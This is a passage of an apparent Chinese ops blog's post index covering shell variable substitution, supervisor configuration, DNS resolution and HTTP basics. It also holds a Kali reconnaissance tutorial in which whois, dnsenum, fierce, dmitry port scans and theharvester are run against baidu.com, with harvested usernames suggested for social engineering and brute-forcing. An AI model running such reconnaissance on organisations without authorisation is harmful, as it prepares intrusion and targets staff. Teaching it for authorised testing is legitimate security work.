若$file设为空值或非空值，均使用my.file.txt作返回值。(没设定时不作处理)$&#123;file:+my.file.txt&#125;:若$file为非空值，则使用my.file.txt作返回值。(没设定及空值时不作处理)$&#123;file=my.file.txt&#125;: 若$file没设定，则使用my.file.txt作返回值，同时将$file 赋值为 my.file.txt。(空值及非空值时不作处理)$&#123;file:=my.file.txt&#125;:若$file没设定或为空值，则使用my.file.txt作返回值，同时将 $file 赋值为 my.file.txt。(非空值时不作处理)$&#123;file?my.file.txt&#125;: 若$file没设定，则将my.file.txt输出至 STDERR。(空值及非空值时不作处理)$&#123;file:?my.file.txt&#125;:若$file没设定或为空值，则将my.file.txt输出至STDERR。(非空值时不作处理)注意: ":+"的情况是不包含空值的.":-", ":="等只要有号就是包含空值(null). 变量的长度1$&#123;#file&#125; 数组运算12345A=(a b c def)$&#123;A[@]&#125; 或 $&#123;A[*]&#125; 可得到 a b c def (全部组数)$&#123;A[0]&#125; 可得到 a (第一个组数)，$&#123;A[1]&#125; 则为第二个组数...$&#123;#A[@]&#125; 或 $&#123;#A[*]&#125; 可得到 4 (全部组数数量)$&#123;#A[0]&#125; 可得到 1 (即第一个组数(a)的长度)，$&#123;#A[3]&#125; 可得到 3 (第四个组数(def)的长度)]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[supervisor使用详解]]></title>
    <url>%2Farticles%2Ff13b8f05.html</url>
    <content type="text"><![CDATA[简介supervisor是用Python开发的一个client/server服务，是Linux/Unix系统下的一个进程管理工具。可以很方便的监听、启动、停止、重启一个或多个进程。用supervisor管理的进程，当一个进程意外被杀死，supervisor监听到进程死后，会自动将它重启，很方便的做到进程自动恢复的功能，不再需要自己写shell脚本来控制。 安装配置好yum源后，可以直接安装 1yum install supervisor 配置安装好后在/etc/会生成一个supervisord.conf文件及一个supervisord.d文件目录 supervisord.conf是一些默认配置，可自行修改： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687[unix_http_server]file=/tmp/supervisor.sock ;UNIX socket 文件，supervisorctl 会使用;chmod=0700 ;socket文件的mode，默认是0700;chown=nobody:nogroup ;socket文件的owner，格式：uid:gid ;[inet_http_server] ;HTTP服务器，提供web管理界面;port=127.0.0.1:9001 ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性;username=user ;登录管理后台的用户名;password=123 ;登录管理后台的密码 [supervisord]logfile=/tmp/supervisord.log ;日志文件，默认是 $CWD/supervisord.loglogfile_maxbytes=50MB ;日志文件大小，超出会rotate，默认 50MB，如果设成0，表示不限制大小logfile_backups=10 ;日志文件保留备份数量默认10，设为0表示不备份loglevel=info ;日志级别，默认info，其它: debug,warn,tracepidfile=/tmp/supervisord.pid ;pid 文件nodaemon=false ;是否在前台启动，默认是false，即以 daemon 的方式启动minfds=1024 ;可以打开的文件描述符的最小值，默认 1024minprocs=200 ;可以打开的进程数的最小值，默认 200 [supervisorctl]serverurl=unix:///tmp/supervisor.sock ;通过UNIX socket连接supervisord，路径与unix_http_server部分的file一致;serverurl=http://127.0.0.1:9001 ; 通过HTTP的方式连接supervisord ; [program:xx]是被管理的进程配置参数，xx是进程的名称[program:xx]command=/opt/apache-tomcat-8.0.35/bin/catalina.sh run ; 程序启动命令autostart=true ; 在supervisord启动的时候也自动启动startsecs=10 ; 启动10秒后没有异常退出，就表示进程正常启动了，默认为1秒autorestart=true ; 程序退出后自动重启,可选值：[unexpected,true,false]，默认为unexpected，表示进程意外杀死后才重启startretries=3 ; 启动失败自动重试次数，默认是3user=tomcat ; 用哪个用户启动进程，默认是rootpriority=999 ; 进程启动优先级，默认999，值小的优先启动redirect_stderr=true ; 把stderr重定向到stdout，默认falsestdout_logfile_maxbytes=20MB ; stdout 日志文件大小，默认50MBstdout_logfile_backups = 20 ; stdout 日志文件备份数，默认是10; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）stdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.outstopasgroup=false ;默认为false,进程被杀死时，是否向这个进程组发送stop信号，包括子进程killasgroup=false ;默认为false，向进程组发送kill信号，包括子进程 ;包含其它配置文件[include]files = relative/directory/*.ini ;可以指定一个或多个以.ini结束的配置文件 注意：[include]默认配置是制定.ini，因个人习惯命名为.conf文件，因此修改配置如下： 12[include]files = relative/directory/*.conf supervisord.d目录用来存放用户自定义的进程配置，参考： 123456789101112131415161718192021[program:es]command=/opt/software/elasticsearch/bin/elasticsearchuser=esstdout_logfile=/opt/supervisor_test/run.logautostart=trueautorestart=truestartsecs=60stopasgroup=trueikillasgroup=truestartretries=1redirect_stderr=true 注意: supervisor不能监控后台进程，command 不能为后台运行命令 服务段启动 1supervisord -c /etc/supervisord.conf 常用命令supervisorctl 是 supervisord的命令行客户端工具 123456789101112131415supervisorctl status：查看所有进程的状态supervisorctl stop es：停止essupervisorctl start es：启动essupervisorctl restart es: 重启essupervisorctl update ：配置文件修改后可以使用该命令加载新的配置supervisorctl reload: 重新启动配置中的所有程序把es 换成all 可以管理配置中的所有进程直接输入：supervisorctl 进入supervisorctl 的shell交互界面，上面的命令不带supervisorctl 可直接使用 直接输入：supervisorctl 进入supervisorctl 的shell交互界面，上面的命令不带supervisorctl 可直接使用 踩过的坑1、unix:///var/run/supervisor/supervisor.sock no such file ​ 问题描述：安装好supervisor没有开启服务直接使用supervisorctl报的错 ​ 解决办法：supervisord -c /etc/supervisord.conf 2、command中指定的进程已经起来，但supervisor还不断重启 ​ 问题描述：command中启动方式为后台启动，导致识别不到pid，然后不断重启，本人使用的是elasticsearch，command 指定的是$path/bin/elasticsearch -d，踩到的坑 ​ 解决办法：supervisor无法检测后台启动进程的pid，而supervisor本身就是后台启动守护进程，因此不用担心这个 3、启动了多个supervisord服务，导致无法正常关闭服务 ​ 问题描述：在运行supervisord -c /etc/supervisord.conf 之前，我直接运行过supervisord -c /etc/supervisord.d/xx.conf ，导致有些进程被多个superviord管理，无法正常关闭进程。 ​ 解决办法： 使用 ps -fe | grep supervisord 查看所有启动过的supervisord服务，kill相关的进程。]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Supervisor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali之信息收集]]></title>
    <url>%2Farticles%2F1c43ef2c.html</url>
    <content type="text"><![CDATA[目的在本文中，我们将讨论渗透测试中第二个阶段——信息收集。我们会介绍Kali中一系列的信息收集工具。在阅读本文之后，我们希望你能对信息收集有更好的理解。 在这个阶段我们需要尽可能多的收集目标的信息，例如：域名的信息，DNS，IP，使用的技术和配置，文件，联系方式等等。在信息收集中，每一个信息都是重要的。 方式信息收集的方式可以分为两种：主动和被动。主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为。被动的信息收集方式：利用第三方的服务对目标进行访问了解，比例：Google搜索。 注意： 没有一种方式是最完美的，每个方式都有自己的优势，主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。被动方式，你收集的信息会先对少，但是你的行动并不会被目标主机发现。一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。 在这章，我们将介绍主动和被动的信息收集方式，来收集一个目标的信息。 信息收集使用公共资源在互联网中，有几个公开的资源网站可以用来对目标信息进行收集，使用这些网站，流量并不会流经目标主机，所以目标主机也不会记录你的行为。 域名注册信息当你知道目标的域名，你首先要做的就是通过Whoist数据库查询域名的注册信息，Whois数据库是提供域名的注册人信息，包括联系方式，管理员名字，管理员邮箱等等，其中也包括DNS服务器的信息。 关于Whois的介绍请访问：https://www.ietf.org/rfc/rfc3912.txt‍ 默认情况下，Kali已经安装了Whois。你只需要输入要查询的域名即可： 1#whois baidu.com (部分) 我们可以获取关于百度的DNS服务器信息，域名注册基本信息。这些信息在以后的测试阶段中有可能会发挥重大的作用。 除了使用whois命令，也有一些网站提供在线whois信息查询： whois.chinaz.com/ www.internic.net/whois.html 收集完域名信息之后，我们将开始收集关于DNS服务器的详细信息。 DNS分析使用DNS分析工具的目的在于收集有关DNS服务器和测试目标的相应记录信息。 以下是几种常见的DNS记录类型： 例如，在一个测试项目中，客户只给了一个域名，需要你用着域名，来查找所有目标主机的IP和可用的域。接下来我们将带你实现这样的功能。 host在获取DNS服务器信息之后，下一步就是借助DNS服务器找出目标主机IP地址。我们可以使用下面的命令行工具来借助一个DNS服务器查找目标主机的IP地址： 1# host www.baidu.com 我们可以看到 有两个IP地址？？ 一般情况下，host查找的是A，AAAA，和MX的记录。 查询详细的记录只需要添加 -a 1#host -a baidu.com 8.8.8.8 这里8.8.8.8是指定一个DNS服务器。 因为 host命令查找记录是通过Kali的DNS服务器系统文件，该文件位于/etc/resolv.conf.你可以往里面添加DNS任意服务器。当然也可以像我一样直接在命令行中指定DNS服务器。 dig除了host命令，你也可以使用dig命令对DNS服务器进行挖掘。相对于host命令，dig命令更具有灵活和清晰的显示信息。 1#dig baidu.com 不使用选项的dig命令，只返回一个记录。如果要返回全部的记录，只需要在命令添加给出的类型： 1#dig baidu.com any dnsenum我们可以利用dnsenum从DNS服务器上获取以下信息： 1231. 主机IP地址2. 该域名的DNS服务器3. 该域名的MX记录 除了被用来获取DNS信息，dnsenum还具有以下特点： 12341. 使用谷歌浏览器获取子域名2. 暴力破解3. C级网络扫描4. 反向查找网络 启动dnsenum，使用如下命令 1#dnsenum 通过一个例子来演示： 1# dnsnum baidu.com 前面我们获取的是IPv4的信息，接下来我们使用dnsdict6**。**该工具可以获取IPv6地址信息 dnsdict61#dnsdict6 默认情况下，dnsdict6将使用自带的字典和八个线程 1#dnsdict6 baidu.com 由此可见，是有默认的状态对百度进行IPv6扫描。 同时，我们也可以使用dnsdict6查找域名上的IPv4，使用选项 -4.并且使用-d还可以收集DNS和NS的信息： 1#dnsdict6 -4 -d baidu.com fiercefierce 是使用多种技术来扫描目标主机IP地址和主机名的一个DNS服务器枚举工具。运用递归的方式来工作。它的工作原理是先通过查询本地DNS服务器来查找目标DNS服务器，然后使用目标DNS服务器来查找子域名。fierce的主要特点就是可以用来地位独立IP空间对应域名和主机名。 启动fierce使用的命令： 1#fierce -h 通过一个例子来演示： 1#fierce -dns baidu.com -threads 3 DMitryDMitry（Deepmagic Information Gathering Tool）是一个一体化的信息收集工具。它可以用来收集以下信息： 123451. 端口扫描2. whois主机IP和域名信息3. 从Netcraft.com获取主机信息4. 子域名5. 域名中包含的邮件地址 尽管这些信息可以在Kali中通过多种工具获取，但是使用DMitry可以将收集的信息保存在一个文件中，方便查看。 使用DMitry可以使用如下命令： 1#dmitry 通过一个例子来演示： 这个演示是要获取 whois ，ip，主机信息，子域名，电子邮件。 1#dmitry -winse baidu.com 再一个例子，通过dmitry 来扫描网站端口 1#dmitry -p baidu.com -f -b 扫描之后我们会发现百度只开放了80端口。（截图只有部分。。。） MaltegoMaltego是一个开源的取证工具。它可以挖掘和收集信息。 Maltego是一个图形界面。 Maltego的基础网络特点： 123451. 域名2. DNS3. Whois4. IP地址5. 网络块 也可以被用于收集相关人员的信息： 12341. 公司、组织2. 电子邮件3. 社交网络关系4. 电话号码 使用Maltego的命令行如下： 1#maltego 第一次运行会出现启动向导： 通过一个例子演示： 使用快捷键ctrl+T来创建新的项目。然后到Palette选项卡，选择基础设施（Infrastructure），选择域（Domain），如果成功建立会出现paterva.com。可以通过双击paterva.com这个图标进行更改 如果你右键单击域名，你会看到所有的功能（变换？？）： 我们使用Other transforms-&gt;DomainToDNSNameSchema 结果如图： 在对域名的DNS变换后，我们得到了百度的相关信息。你还可以试试其他（变换）功能。 利用搜索引擎Kali 工具集中用可以用来收集域，电子邮件等信息的工具，这些工具使用第三方搜索引擎进行信息收集，这样的好处在于我们不用直接访问目标，目标并不知道你的行动。 theharvestertheharvester是一个电子邮件，用户名和主机名/子域名信息收集工具。它收集来自各种公开的信息来源。最新版本支持的信息来源包括： 123456781. Google2. Google profiles3. Bing4. PGP5. LinkedIn6. Yandex7. People1238. Jigsaw 使用theharvester 命令行： 1# theharvester 通过一个例子来演示： 通过bing来收集 1#theharvester -d baidu.com -l 100 -b bing 如果我们想收集目标用户名，我们可以通过LinkedIn.com查找。命令如下： 1#theharvester -d baidu.com -l 100 -b linkedin 从LinkedIn收集的用户名在后续的测试中将会有很大的用处。例如：社会工程学攻击。 MetagoofilMetagoofil是一款利用Google收集信息的工具，目前支持的类型如下： 12341. word2. ppt3. Excel4. PDF 使用Metagoofil的命令： 1#Metagoofil 通过一个例子来演示： 1#metagoofil -d baidu.com -l 20 -t doc,pdf -n 5 -f test.html -o test 通过这个工具我们可以看到收集到的资料非常多，如，用户名，路径信息。我们可以通过这些用户名进行暴力破解。 通过生成的HTML版的报告，我们可以非常清晰的看到我们收集的信息种类： 至此，我们的信息收集工具介绍已经完成。每个渗透目标，想要通过不同的途径获取目标大量信息。]]></content>
      <categories>
        <category>运维安全</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS解析过程详解]]></title>
    <url>%2Farticles%2Fa8e7b880.html</url>
    <content type="text"><![CDATA[目的本文详细介绍了dns的解析过程，以及对解析过程中所涉及的名词进行说明。 根域就是所谓的“.”，其实我们的网址www.baidu.com在配置当中应该是www.baidu.com.（最后有一点），一般我们在浏览器里输入时会省略后面的点，而这也已经成为了习惯。 根域服务器我们知道有13台，但是这是错误的观点。 根域服务器只是具有13个IP地址，但机器数量却不是13台，因为这些IP地址借助了任播的技术，所以我们可以在全球设立这些IP的镜像站点，你访问到的这个IP并不是唯一的那台主机。 具体的镜像分布可以参考维基百科。这些主机的内容都是一样的 域的划分根域下来就是顶级域或者叫一级域， 有两种划分方式，一种互联网刚兴起时的按照行业性质划分的com.，net.等，一种是按国家划分的如cn.，jp.，等。 具体多少你可以自己去查，我们这里不关心。 每个域都会有域名服务器，也叫权威域名服务器。 Baidu.com就是一个顶级域名，而www.baidu.com却不是顶级域名，他是在baidu.com 这个域里的一叫做www的主机。 一级域之后还有二级域，三级域，只要我买了一个顶级域，并且我搭建了自己BIND服务器（或者其他软件搭建的）注册到互联网中，那么我就可以随意在前面多加几个域了（当然长度是有限制的）。 比如a.www.baidu.com，在这个网址中，www.baidu.com变成了一个二级域而不是一台主机，主机名是a。 域名服务器能提供域名解析的服务器，上面的记录类型可以是A(address)记录，NS记录（name server），MX（mail），CNAME等。 A记录是什么意思呢，就是记录一个IP地址和一个主机名字，比如我这个域名服务器所在的域test.baidu.com，我们知道这是一个二级的域名，然后我在里面有一条A记录,记录了主机为a的IP，查到了就返回给你了。 如果我现在要想baidu.com这个域名服务器查询a.test.baidu.com，那么这个顶级域名服务器就会发现你请求的这个网址在 test.baidu.com这个域中，我这里记录了这个二级域的域名服务器test.baidu.com的NS的IP。我返回给你这个地址你再去查主机 为a的主机把。 这些域内的域名服务器都称为权威服务器，直接提供DNS查询服务。（这些服务器可不会做递归哦） 解析过程那么我们的DNS是怎么解析一个域名的呢？ 现在我有一台计算机，通过ISP接入了互联网，那么ISP就会给我分配一个DNS服务器，这个DNS服务器不是权威服务器，而是相当于一个代理的dns解析服务器，他会帮你迭代权威服务器返回的应答，然后把最终查到IP返回给你。 现在的我计算机要向这台ISPDNS发起请求查询www.baidu.com这个域名了，(经网友提醒：这里其实准确来说不是ISPDNS，而应该是用户自己电脑网络设置里的DNS，并不一定是ISPDNS。比如也有可能你手工设置了8.8.8.8) ISPDNS拿到请求后，先检查一下自己的缓存中有没有这个地址，有的话就直接返回。这个时候拿到的ip地址，会被标记为非权威服务器的应答。 如果缓存中没有的话，ISPDNS会从配置文件里面读取13个根域名服务器的地址（这些地址是不变的，直接在BIND的配置文件中）， 然后像其中一台发起请求。 根服务器拿到这个请求后，知道他是com.这个顶级域名下的，所以就会返回com域中的NS记录，一般来说是13台主机名和IP。 然后ISPDNS向其中一台再次发起请求，com域的服务器发现你这请求是baidu.com这个域的，我一查发现了这个域的NS，那我就返回给你，你再去查。 （目前百度有4台baidu.com的顶级域名服务器）。 ISPDNS不厌其烦的再次向baidu.com这个域的权威服务器发起请求，baidu.com收到之后，查了下有www的这台主机，就把这个IP返回给你了， 然后ISPDNS拿到了之后，将其返回给了客户端，并且把这个保存在高速缓存中。 验证下面我们来用 nslookup 这个工具详细来说一下解析步骤： 从上图我们可以看到: 第一行Server是：DNS服务器的主机名–210.32.32.1 第二行Address是： 它的IP地址–210.32.32.1#53 下面的Name是：解析的URL– www.jsjzx.com Address是：解析出来的IP–112.121.162.168 但是也有像百度这样的DNS比较复杂的解析: 你会发现百度有一个cname = www.a.shifen.com 的别名。 这是怎么一个过程呢？ 我们用dig工具来跟踪一下把（linux系统自带有） Dig工具会在本地计算机做迭代，然后记录查询的过程。 第一步：是向我这台机器的ISPDNS获取到根域服务区的13个IP和主机名[b-j].root-servers.net.。 第二步：是向其中的一台根域服务器（Servername就是末行小括号里面的）发送www.baidu.com的查询请求，他返回了com.顶级域的服务器IP（未显示）和名称， 第三步：便向com.域的一台服务器192.33.4.12请求,www.baidu.com，他返回了baidu.com域的服务器IP（未显示）和名称，百度有四台顶级域的服务器 ​ 【此处可以用dig @192.33.4.12 www.baidu.com查看返回的百度顶级域名服务器IP地址】。 第四步：向百度的顶级域服务器（202.108.22.220）请求www.baidu.com，他发现这个www有个别名，而不是一台主机，别名是www.a.shifen.com。 按照一般的逻辑，当dns请求到别名的时候，查询会终止，而是重新发起查询别名的请求，所以此处应该返回的是www.a.shifen.com而已。 但是为什么返回a.shifen.com的这个域的NS呢？ 我们可以尝试下面的这个命令：dig +trace shifen.com 看看有什么结果。。。。。。。。 你会发现第三步时shifen.com这个顶级域的域名服务器和baidu.com这个域的域名服务器是同一台主机（即：dns.baidu.com）！ 当我拿到www.baidu.com的别名www.a.shifen.com的时候，我本来需要重新到com域查找shifen.com域的NS，但是因为这两个域在同一台NS上，所以直接向本机发起了， shifen.com域发现请求的www.a.shifen.com是属于a.shifen.com这个域的， 于是就把a.shifen.com的这个NS和IP返回，让我到a.shifen.com这个域的域名服务器上查询www.a.shifen.com。 于是我便从ns X .a.shifen.com中一台拿到了一条A记录，最终的最终也便是www.baidu.com的IP地址了.【此处也可以用dig +trace www.a.shifen.com】跟踪一下 用一个图来说明一下(图中第三步的全世界只有13台是错误的) 以下内容为在虚拟机中搭建local dns服务器得到的实验数据，纠正上述结论 在上面的分析中，我们用dig工具进行了追踪，但是dig没有继续追踪当我们从baidu.com拿到cname和ns2.a.shifen.com的IP之后的事情。 我们就所以然的下结论认为local dns会向ns2.a.shifen.com请求www.a.shifenc.om。 其实这个想法是错误，在自己的本地搭建一个local dns，抓取整个解析过程中是所有包，看看就明白拉。 实际的结果是虽然dns.baidu.com返回了a.shifen.com域的服务器地址和IP， 但是local dns并不是直接向上述返回的IP请求www.a.shifen.com，而是再一次去请求com域，得到shifen.com域的服务器（也就是baidu.com的那四台）， 然后又请求www.a.shifen.com，返回a.shifen.com的域的服务器，最后才是去请求www.a.shifen.com， 虽然上面已经返回了IP，但是实验的结果就是再走一遍shifen.com域的查询。 上图就是localdns在解析www.baidu.com的抓包全过程。蓝色那条就是在收到cname和响应的a.shifen.com的域名服务器IP地址之后，继续向com域请求shifen.com。 这个图充分说明了返回cname的同时也返回了ns2.a.shifen.com的IP。 总结①本机向local dns请求www.baidu.com ②local dns向根域请求www.baidu.com，根域返回com.域的服务器IP ③向com.域请求www.baidu.com，com.域返回baidu.com域的服务器IP ④向baidu.com请求www.baidu.com，返回cname www.a.shifen.com和a.shifen.com域的服务器IP ⑤向root域请求www.a.shifen.com ⑥向com.域请求www.a.shife.com ⑦向shifen.com请求 ⑧向a.shifen.com域请求 ⑨拿到www.a.shifen.com的IP ⑩localdns返回本机www.baidu.com cname www.a.shifen.com 以及 www.a.shifen.com的IP]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Dns</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[http协议详解]]></title>
    <url>%2Farticles%2F5806080f.html</url>
    <content type="text"><![CDATA[简介HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。 主要特点：1.支持客户/服务器模式。2.简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。3.灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。4.无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。5.无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。 详解篇HTTP协议详解之URL篇http（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。 HTTP URL (URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息)的格式如下：[http://host[&quot;:&quot;port\][abs_path](http://host[port][abs_path/)]http表示要通过HTTP协议来定位网络资源；host表示合法的Internet主机域名或者IP地址；port指定一个端口号，为空则使用缺省端口80；abs_path指定请求资源的URI；如果URL中没有给出abs_path，那么当它作为请求URI时，必须以“/”的形式给出，通常这个工作浏览器自动帮我们完成。例1、输入：www.guet.edu.cn浏览器自动转换成：http://www.guet.edu.cn/2、http:192.168.0.116:8080/index.jsp HTTP协议详解之请求篇http请求由三部分组成，分别是：请求行、消息报头、请求正文 1、请求行 请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本，格式如下：Method Request-URI HTTP-Version CRLF 其中 Method表示请求方法；Request-URI是一个统一资源标识符；HTTP-Version表示请求的HTTP协议版本；CRLF表示回车和换行（除了作为结尾的CRLF外，不允许出现单 独的CR或LF字符）。 请求方法（所有方法全为大写）有多种，各个方法的解释如下： GET ：请求获取Request-URI所标识的资源 POST：在Request-URI所标识的资源后附加新的数据 HEAD：请求获取由Request-URI所标识的资源的响应消息报头 PUT ： 请求服务器存储一个资源，并用Request-URI作为其标识 DELETE： 请求服务器删除Request-URI所标识的资源 TRACE：请求服务器回送收到的请求信息，主要用于测试或诊断CONNECT 保留将来使用OPTIONS 请求查询服务器的性能，或者查询与资源相关的选项和需求 应用举例：GET方法：在浏览器的地址栏中输入网址的方式访问网页时，浏览器采用GET方法向服务器获取资源，例:GET /form.html HTTP/1.1 (CRLF) POST方法要求被请求服务器接受附在请求后面的数据，常用于提交表单。例： POST /reg.jsp HTTP/ (CRLF)Accept:image/gif,image/x-xbit,… (CRLF)…HOST:www.guet.edu.cn (CRLF)Content-Length:22 (CRLF)Connection:Keep-Alive (CRLF)Cache-Control:no-cache (CRLF)(CRLF) //该CRLF表示消息报头已经结束，在此之前为消息报头user=jeffrey&amp;pwd=1234 //此行以下为提交的数据 HEAD方法与GET方法几乎是一样的，对于HEAD请求的回应部分来说，它的HTTP头部中包含的信息与通过GET请求所得到的信息是相同的。利用这个方法，不必传输整个资源 内容，就可以得到Request-URI所标识的资源的信息。该方法常用于测试超链接的有效性，是否可以访问，以及最近是否更新。 2、请求报头后述 3、请求正文(略) HTTP协议详解之响应篇​ 在接收和解释请求消息后，服务器返回一个HTTP响应消息。 HTTP响应也是由三个部分组成，分别是：状态行、消息报头、响应正文 1、状态行格式如下： HTTP-Version Status-Code Reason-Phrase CRLF其中，HTTP-Version表示服务器HTTP协议的版本；Status-Code表示服务器发回的响应状态代码；Reason-Phrase表示状态代码的文本描述。状态代码有三位数字组成，第一个数字定义了响应的类别，且有五种可能取值：1xx：指示信息–表示请求已接收，继续处理2xx：成功–表示请求已被成功接收、理解、接受3xx：重定向–要完成请求必须进行更进一步的操作4xx：客户端错误–请求有语法错误或请求无法实现5xx：服务器端错误–服务器未能实现合法的请求常见状态代码、状态描述、说明：200 OK //客户端请求成功400 Bad Request //客户端请求有语法错误，不能被服务器所理解401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用403 Forbidden //服务器收到请求，但是拒绝提供服务404 Not Found //请求资源不存在，eg：输入了错误的URL500 Internal Server Error //服务器发生不可预期的错误503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常eg：HTTP/1.1 200 OK （CRLF） 2、响应报头后述 3、响应正文就是服务器返回的资源的内容 HTTP协议详解之消息报头篇​ HTTP消息由客户端到服务器的请求和服务器到客户端的响应组成。请求消息和响应消息都是由开始行（对于请求消息，开始行就是请求行，对于响应消息，开始行就是状态 行），消息报头（可选），空行（只有CRLF的行），消息正文（可选）组成。 HTTP消息报头包括普通报头、请求报头、响应报头、实体报头。每一个报头域都是由名字+“：”+空格+值 组成，消息报头域的名字是大小写无关的。 1、普通报头 在普通报头中，有少数报头域用于所有的请求和响应消息，但并不用于被传输的实体，只用于传输的消息。 Cache-Control 用于指定缓存指令，缓存指令是单向的（响应中出现的缓存指令在请求中未必会出现），且是独立的（一个消息的缓存指令不会影响另一个消息处理的缓存机 制），HTTP1.0使用的类似的报头域为Pragma。 请求时的缓存指令包括：no-cache（用于指示请求或响应消息不能缓存）、no-store、max-age、max-stale、min-fresh、only-if-cached; 响应时的缓存指令包括：public、private、no-cache、no-store、no-transform、must-revalidate、proxy-revalidate、max-age、s-maxage. 例：为了指示IE浏览器（客户端）不要缓存页面，服务器端的JSP程序可以编写如下：response.sehHeader(“Cache-Control”,”no-cache”); //response.setHeader(“Pragma”,”no-cache”);作用相当于上述代码，通常两者//合用 这句代码将在发送的响应消息中设置普通报头域：Cache-Control:no-cache Date普通报头域表示消息产生的日期和时间 Connection普通报头域允许发送指定连接的选项。例如指定连接是连续，或者指定“close”选项，通知服务器，在响应完成后，关闭连接 2、请求报头 请求报头允许客户端向服务器端传递请求的附加信息以及客户端自身的信息。常用的请求报头 Content-Type MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型。在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。 例如： Content-Type: text/html;charset:utf-8; 常见的媒体格式类型如下： ​ text/html ： HTML格式 ​ text/plain ：纯文本格式 ​ text/xml ： XML格式 ​ image/gif ：gif图片格式 ​ image/jpeg ：jpg图片格式 ​ image/png：png图片格式 以application开头的媒体格式类型： application/xhtml+xml ：XHTML格式 application/soap+xml ：基于soap1.2协议的webservice请求所使用 application/xml ： XML数据格式 application/atom+xml ：Atom XML聚合格式 application/json ： JSON数据格式 application/pdf ：pdf格式 application/msword ： Word文档格式 application/octet-stream ： 二进制流数据（如常见的文件下载） application/x-www-form-urlencoded ： 中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式） 另外一种常见的媒体格式是上传文件之时使用的： ​ multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式 以上就是我们在日常的开发中，经常会用到的若干content-type的内容格式。 AcceptAccept请求报头域用于指定客户端接受哪些类型的信息。eg：Accept：image/gif，表明客户端希望接受GIF图象格式的资源；Accept：text/html，表明客户端希望接受html文本。 Accept-CharsetAccept-Charset请求报头域用于指定客户端接受的字符集。例：Accept-Charset:iso-8859-1,gb2312.如果在请求消息中没有设置这个域，缺省是任何字符集都可以接受。 Accept-EncodingAccept-Encoding请求报头域类似于Accept，但是它是用于指定可接受的内容编码。例：Accept-Encoding:gzip.deflate.如果请求消息中没有设置这个域服务器假定客户端对各种内容编码都可以接受。 Accept-LanguageAccept-Language请求报头域类似于Accept，但是它是用于指定一种自然语言。例：Accept-Language:zh-cn.如果请求消息中没有设置这个报头域，服务器假定客户端对各种语言都可以接受。 AuthorizationAuthorization请求报头域主要用于证明客户端有权查看某个资源。当浏览器访问一个页面时，如果收到服务器的响应代码为401（未授权），可以发送一个包含Authorization请求报头域的请求，要求服务器对其进行验证。 Host（发送请求时，该报头域是必需的）Host请求报头域主要用于指定被请求资源的Internet主机和端口号，它通常从HTTP URL中提取出来的， 例：我们在浏览器中输入：http://www.guet.edu.cn/index.html浏览器发送的请求消息中，就会包含Host请求报头域，如下：Host：www.guet.edu.cn此处使用缺省端口号80，若指定了端口号，则变成：Host：www.guet.edu.cn:指定端口号 User-Agent 我们上网登陆论坛的时候，往往会看到一些欢迎信息，其中列出了你的操作系统的名称和版本，你所使用的浏览器的名称和版本，这往往让很多人感到很神奇，实际上，服务器应用程序就是从User-Agent这个请求报头域中获取到这些信息。User-Agent请求报头域允许客户端将它的操作系统、浏览器和其它属性告诉服务器。不过，这个报头域不是必需的，如果我们自己编写一个浏览器，不使用User-Agent请求报头域，那么服务器端就无法得知我们的信息了。 请求报头举例： 3、响应报头 响应报头允许服务器传递不能放在状态行中的附加响应信息，以及关于服务器的信息和对Request-URI所标识的资源进行下一步访问的信息。常用的响应报头LocationLocation响应报头域用于重定向接受者到一个新的位置。Location响应报头域常用在更换域名的时候。ServerServer响应报头域包含了服务器用来处理请求的软件信息。与User-Agent请求报头域是相对应的。下面是Server响应报头域的一个例子：Server：Apache-Coyote/1.1WWW-AuthenticateWWW-Authenticate响应报头域必须被包含在401（未授权的）响应消息中，客户端收到401响应消息时候，并发送Authorization报头域请求服务器对其进行验证时，服务端响应报头就包含该报头域。例：WWW-Authenticate:Basic realm=”Basic Auth Test!” //可以看出服务器对请求资源采用的是基本验证机制。 4、实体报头 